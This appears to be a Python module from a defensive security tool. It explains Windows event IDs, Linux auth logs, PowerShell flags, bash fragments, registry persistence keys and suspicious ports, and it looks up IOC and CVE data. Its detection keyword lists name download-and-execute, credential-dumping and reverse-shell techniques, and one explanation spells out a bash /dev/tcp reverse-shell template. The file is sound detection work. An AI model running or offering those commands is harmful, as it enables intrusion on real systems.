import json
import re

from src.database import get_db

WINDOWS_EVENT_IDS: dict[str, str] = {
    "4624": "An account was successfully logged on. This is a normal event, but can indicate successful intrusion if coming from unusual locations.",
    "4625": "An account failed to log on. Multiple occurrences may indicate a brute-force attack. Track source IP and username.",
    "4672": "Special privileges assigned to new logon. Often seen with administrative logins. Monitor for unusual privilege assignments.",
    "4688": "A new process has been created. Key for detecting process injection, malware execution, and suspicious parent-child chains.",
    "4657": "A registry value was modified. Critical for detecting persistence mechanisms like Run keys, service trigger entries.",
    "5156": "The Windows Filtering Platform allowed a connection. Monitor for unusual outbound connections to unknown IPs.",
    "5158": "The Windows Filtering Platform permitted a bind to a local port. Can indicate backdoor listening ports.",
    "7045": "A service was installed in the system. Common persistence technique for malware. Verify service name, path, and publisher.",
    "4697": "A service was installed in the system (similar to 7045). Monitor for services with suspicious paths or names.",
    "4104": "Windows PowerShell script block logging. Captures full script content. Critical for detecting malicious PS scripts.",
    "4103": "PowerShell pipeline execution details. Provides parameter analysis for PS commands.",
    "400": "PowerShell engine started. Look for -EncodedCommand or -ExecutionPolicy Bypass flags.",
    "403": "PowerShell engine stopped. Combine with event 400 to identify PS session duration.",
    "4663": "An attempt was made to access an object. Monitor for sensitive file access (SAM, SYSTEM, LSASS).",
    "4656": "A handle to an object was requested. Precursor to 4663. Can indicate enumeration attempts.",
    "4732": "A member was added to a security-enabled local group. Monitor additions to Administrators, Remote Desktop Users.",
    "528": "Successful logon (Windows 2000 format). See 4624 for modern equivalent.",
    "529": "Failed logon (Windows 2000 format). See 4625 for modern equivalent.",
    "592": "A new process was created (Windows 2000). See 4688 for modern equivalent.",
    "6011": "Service install attempt. Monitor for unexpected service creation.",
    "539": "Account locked out. Multiple lockouts may indicate brute-force or password spraying.",
}

LINUX_EVENT_EXPLANATIONS: dict[str, str] = {
    "failed password": "Failed SSH password authentication. Indicates brute-force attack or credential guessing when repeated.",
    "accepted password": "Successful SSH password authentication. Expected for legitimate access; suspicious from unknown IPs.",
    "accepted publickey": "Successful SSH key-based authentication. More secure than passwords. Investigate unknown keys.",
    "session opened": "PAM session opened for user. Normal for logins; anomalous if from unexpected source or time.",
    "session closed": "PAM session closed. Normal terminal session end.",
    "sudo": "Sudo command execution. Privilege escalation event. Monitor for unexpected sudo use by non-admin users.",
    "su ": "Switch user command. Can indicate lateral movement or privilege escalation.",
    "cron": "Cron job execution. Check for unauthorized scheduled tasks as persistence mechanism.",
    "useradd": "New user account created. Potential backdoor account creation.",
    "groupadd": "New group created. May precede privilege escalation.",
    "service started": "System service started. Monitor for unexpected service launches.",
    "systemd": "Systemd unit operation. Check for unauthorized service files in /etc/systemd/system/.",
    "connection from": "Inbound network connection. Log source IP and port for threat intel lookup.",
    "connected to": "Outbound network connection. Investigate connections to known-bad or unusual destinations.",
}

POWERSHELL_EXPLANATIONS: dict[str, str] = {
    "-encodedcommand": "Base64-encoded PowerShell command. Often used to obfuscate malicious code. Decode and analyze the payload.",
    "-e ": "Shorthand for -EncodedCommand. Same obfuscation risk.",
    "-executionpolicy bypass": "Bypasses PowerShell execution policy. Common in attacker scripts to run unsigned code.",
    "-windowstyle hidden": "Runs PowerShell without showing a window. Common in malware and persistence mechanisms.",
    "invoke-expression": "IEX - Downloads and executes code in memory. Fileless malware technique.",
    "invoke-webrequest": "IWR - Downloads content from the web. Used for payload download. Monitor URLs.",
    "invoke-mimikatz": "Invokes Mimikatz for credential dumping. Critical security event.",
    "invoke-wmimethod": "WMI method invocation. Can be used for lateral movement and remote execution.",
    "new-object system.net.webclient": "Creates a web client object. Often used with .DownloadString() for fileless execution.",
    "downloadstring": "Downloads content as string. Combined with IEX for fileless malware execution.",
    "start-process": "Starts a new process. Can be used for process injection or launching payloads.",
    "register-scheduledjob": "Creates a scheduled job. Persistence mechanism.",
    "new-service": "Creates a new Windows service. Persistence mechanism requiring admin privileges.",
}

BASH_EXPLANATIONS: dict[str, str] = {
    "curl": "Data transfer tool. Used for downloading payloads or C2 communication. Check the destination URL.",
    "wget": "File download tool. Often used in dropper scripts to fetch malware from remote servers.",
    "chmod +x": "Makes a file executable. Common after downloading a binary payload.",
    "chmod 777": "Sets full permissions on a file. Suspicious when applied to scripts or binaries in /tmp.",
    "./": "Executes a file in the current directory. May indicate a locally compiled or downloaded binary.",
    "bash -i": "Starts an interactive bash shell. Can be part of a reverse shell when combined with redirection.",
    "/dev/tcp": "Bash TCP connection primitive. Used in reverse shells: bash -i >& /dev/tcp/IP/PORT 0>&1",
    "exec": "Replaces current process with a new one. Can be used for process masquerading.",
    "nohup": "Runs a process that ignores hangup signals. Used to maintain persistence after terminal closes.",
    "&> /dev/null": "Redirects all output to null. Common in malicious scripts to hide execution noise.",
    "python -c": "Executes Python one-liner. Often used for cross-platform payload execution.",
    "base64 -d": "Decodes base64 data. Often used to decode obfuscated payloads or configuration data.",
    "mkfifo": "Creates a named pipe (FIFO). Used in some reverse shell implementations.",
    "nmap": "Network scanner. May indicate reconnaissance or lateral movement preparation.",
    "ssh": "SSH client. Check for unusual SSH tunnels or connections to external hosts.",
}

REGISTRY_EXPLANATIONS: dict[str, str] = {
    r"currentversion\\run": "Run registry key - auto-start location for programs at user logon. Common persistence location.",
    r"currentversion\\runonce": "RunOnce key - programs that run once at next logon. Some malware uses this for one-time execution.",
    r"currentversion\\runservices": "RunServices - legacy auto-start for services. Monitor for unknown entries.",
    r"currentversion\\windows\\run": "Similar to Run key under Windows subkey. Less common but used by some malware.",
    r"microsoft\\windows\\currentversion\\run": "Full path to Run key. Common persistence location for both legitimate and malicious software.",
    r"\software\\microsoft\\windows\\currentversion\\run": "HKCU/HKLM Run key. Malware frequently adds entries here to survive reboots.",
    r"userinit": "Userinit key - program run at user logon before explorer. Replacing this with malware enables persistence.",
    r"shell": "Shell key - specifies the default shell program. Some malware replaces this with their executable.",
    r"appinit_dlls": "AppInit_DLLs - DLLs loaded by every process loading user32.dll. Powerful persistence technique.",
    r"knownDLLs": "KnownDLLs - can be modified for DLL hijacking. Advanced persistence technique.",
    r"image file execution options": "IFEO - debugger key that can redirect process execution. Used for process hijacking.",
    r"service": "Service key in registry. New services registered here can auto-start and run as SYSTEM.",
}

NETWORK_EXPLANATIONS: dict[str, str] = {
    "port 21": "FTP - File transfer. Unusual outbound FTP may indicate data exfiltration.",
    "port 22": "SSH - Secure Shell. Encrypted tunnel that can be used for C2 or data exfiltration.",
    "port 23": "Telnet - Unencrypted remote access protocol. Rare in modern networks; possible scanning.",
    "port 25": "SMTP - Email. Unusual outbound SMTP may indicate spam bot or data exfiltration.",
    "port 53": "DNS - Domain Name System. Can be used for DNS tunneling (data exfiltration over DNS queries).",
    "port 80": "HTTP - Unencrypted web. Common for C2 traffic; inspect URLs and user agents.",
    "port 443": "HTTPS - Encrypted web. Common C2 channel; check certificate details and JA3 hashes.",
    "port 445": "SMB - Windows file sharing. Outbound SMB to internet suggests potential worm or lateral movement.",
    "port 1433": "MSSQL - SQL Server database. Outbound SQL may indicate data exfiltration or unauthorized access.",
    "port 3306": "MySQL - MySQL database. Unusual outbound MySQL traffic warrants investigation.",
    "port 3389": "RDP - Remote Desktop. Can indicate lateral movement or unauthorized remote access.",
    "port 4444": "Metasploit default - Often used by Metasploit payloads for reverse shells. Highly suspicious.",
    "port 5900": "VNC - Remote desktop protocol. Unusual VNC connections may indicate unauthorized access.",
    "port 8080": "HTTP-Alt - Alternative HTTP port. Common for proxy/C2 traffic; inspect URLs.",
    "port 1337": "Often used by malware for C2 or backdoor communication. Highly suspicious.",
}


def explain_event_id(event_id: str) -> str | None:
    upper = event_id.upper().strip()
    if upper in WINDOWS_EVENT_IDS:
        return f"**Event ID {upper}**: {WINDOWS_EVENT_IDS[upper]}"

    all_ids = {**WINDOWS_EVENT_IDS}
    for eid, desc in all_ids.items():
        if upper in eid or eid in upper:
            return f"**Event ID {eid}**: {desc}"
    return None


def explain_windows_log(raw: str) -> str:
    lower = raw.lower()
    for eid, desc in WINDOWS_EVENT_IDS.items():
        if eid in raw or eid in lower:
            return f"**Event ID {eid} detected**: {desc}"
    return ""


def explain_linux_log(raw: str) -> str:
    lower = raw.lower()
    for keyword, explanation in LINUX_EVENT_EXPLANATIONS.items():
        if keyword in lower:
            return f"**{keyword.strip()}**: {explanation}"
    return ""


def explain_powershell(raw: str) -> str:
    lower = raw.lower()
    results = []
    for keyword, explanation in POWERSHELL_EXPLANATIONS.items():
        if keyword in lower:
            results.append(f"- `{keyword}`: {explanation}")
    return "\n".join(results)


def explain_bash(raw: str) -> str:
    lower = raw.lower()
    results = []
    for keyword, explanation in BASH_EXPLANATIONS.items():
        if keyword in lower:
            results.append(f"- `{keyword}`: {explanation}")
    return "\n".join(results)


def explain_registry(raw: str) -> str:
    lower = raw.lower()
    for keyword, explanation in REGISTRY_EXPLANATIONS.items():
        if keyword in lower:
            return f"**Registry Key**: `{keyword}`\n\n{explanation}"
    return ""


def explain_network(raw: str) -> str:
    lower = raw.lower()
    results = []
    for keyword, explanation in NETWORK_EXPLANATIONS.items():
        if keyword in lower:
            results.append(f"- {keyword}: {explanation}")
    return "\n".join(results)


def explain_ioc(indicator: str, ioc_type: str) -> str:
    with get_db() as conn:
        row = conn.execute(
            "SELECT * FROM ioc_reputation WHERE indicator = ?", (indicator,)
        ).fetchone()

    if row:
        d = dict(row)
        malware = json.loads(d.get("malware_associations", "[]"))
        actors = json.loads(d.get("threat_actor_associations", "[]"))
        parts = [
            f"**IOC: {indicator}**",
            f"- Type: {ioc_type}",
            f"- Threat Score: {d['threat_score']}/10",
            f"- Detection Ratio: {d.get('detection_ratio', 'N/A')}",
            f"- Country: {d.get('country', 'N/A')}",
            f"- ASN: {d.get('asn', 'N/A')}",
        ]
        if malware:
            parts.append(f"- Malware Associations: {', '.join(malware)}")
        if actors:
            parts.append(f"- Threat Actor Associations: {', '.join(actors)}")
        return "\n".join(parts)

    return f"**IOC: {indicator}** ({ioc_type})\nNo reputation data available for this indicator."


def explain_cve(cve_id: str) -> str:
    with get_db() as conn:
        rows = conn.execute(
            "SELECT chunk_text, metadata FROM document_index WHERE source_type = 'cve' AND source_id = ?",
            (cve_id,),
        ).fetchall()
    if rows:
        return rows[0]["chunk_text"]
    return f"**{cve_id}**: No detailed information available in local index. Use the CVE lookup API (`GET /api/v1/threat/cve/{cve_id}`) for live data."


def explain_general(text: str) -> str:
    if re.search(r"event\s*(?:id)?\s*[:#]?\s*\d{3,5}", text, re.IGNORECASE):
        match = re.search(r"(\d{3,5})", text)
        if match:
            result = explain_event_id(match.group(1))
            if result:
                return result

    lower = text.lower()
    explanations = []

    if "powershell" in lower or "-encodedcommand" in lower or "pwsh" in lower:
        exp = explain_powershell(text)
        if exp:
            explanations.append("### PowerShell Analysis\n" + exp)

    if "bash" in lower or "curl" in lower or "wget" in lower or "chmod" in lower:
        exp = explain_bash(text)
        if exp:
            explanations.append("### Bash Command Analysis\n" + exp)

    if "registry" in lower or "run key" in lower or "currentversion" in lower:
        exp = explain_registry(text)
        if exp:
            explanations.append("### Registry Analysis\n" + exp)

    if "port" in lower or "connection" in lower or "network" in lower:
        exp = explain_network(text)
        if exp:
            explanations.append("### Network Analysis\n" + exp)

    if "failed password" in lower or "sshd" in lower or "accepted password" in lower:
        exp = explain_linux_log(text)
        if exp:
            explanations.append("### Linux Log Analysis\n" + exp)

    if explanations:
        return "\n\n".join(explanations)

    if re.search(r"\b(cve|cvss)\b", lower, re.IGNORECASE):
        match = re.search(r"(CVE-\d{4}-\d{4,7})", text, re.IGNORECASE)
        if match:
            return explain_cve(match.group(1).upper())

    if "ioc" in lower or "indicator" in lower or "reputation" in lower:
        ip_match = re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", text)
        domain_match = re.search(r"\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b", text)
        if ip_match:
            return explain_ioc(ip_match.group(0), "ip")
        if domain_match:
            return explain_ioc(domain_match.group(0), "domain")

    return ""
